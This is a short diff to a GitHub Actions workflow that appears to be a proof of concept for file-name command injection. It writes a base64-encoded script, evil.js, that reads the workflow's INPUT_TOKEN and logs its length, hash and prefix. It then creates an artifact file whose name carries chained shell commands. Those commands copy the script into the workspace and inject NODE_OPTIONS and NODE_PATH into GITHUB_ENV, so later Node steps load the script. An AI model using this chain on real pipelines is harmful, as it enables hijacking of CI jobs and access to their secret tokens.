@@ -17,7 +17,7 @@ jobs:
           printf 'hello\n' > content/report.txt
           printf 'x\n' > content/x
           echo 'Y29uc3QgYz1yZXF1aXJlKCJjcnlwdG8iKTt0cnl7Y29uc3QgdD1wcm9jZXNzLmVudi5JTlBVVF9UT0tFTnx8IiI7Y29uc3QgaD1jLmNyZWF0ZUhhc2goInNoYTI1NiIpLnVwZGF0ZSh0KS5kaWdlc3QoImhleCIpO2NvbnNvbGUubG9nKCJOT0RFSElKQUNLIGxlbj0iK3QubGVuZ3RoKyIgc2hhPSIraCsiIGdoPSIrKHQuaW5kZXhPZigiZ2giKT09PTA/InllcyI6Im5vIikpO31jYXRjaChlKXtjb25zb2xlLmxvZygiTk9ERUhJSkFDS19FUlIgIitlLm1lc3NhZ2UpO30K' | base64 -d > content/evil.js
-          printf 'y\n' > 'content/x;cp /tmp/content/content/evil.js $PWD/evil.js;sed -i 1iNODE_OPTIONS=--require=$PWD/evil.js $GITHUB_ENV;true;#.txt'
+          printf 'y\n' > 'content/x;cd ..;cd ..;cd ..;cd ..;cd ..;cd tmp;cd content;cd content;cp evil.js $GITHUB_WORKSPACE;cd $GITHUB_WORKSPACE;sed -i 1iNODE_PATH=$PWD $GITHUB_ENV;sed -i 1iNODE_OPTIONS=--require=evil $GITHUB_ENV;true;#.txt'
       - uses: actions/upload-artifact@v4
         with:
           name: content
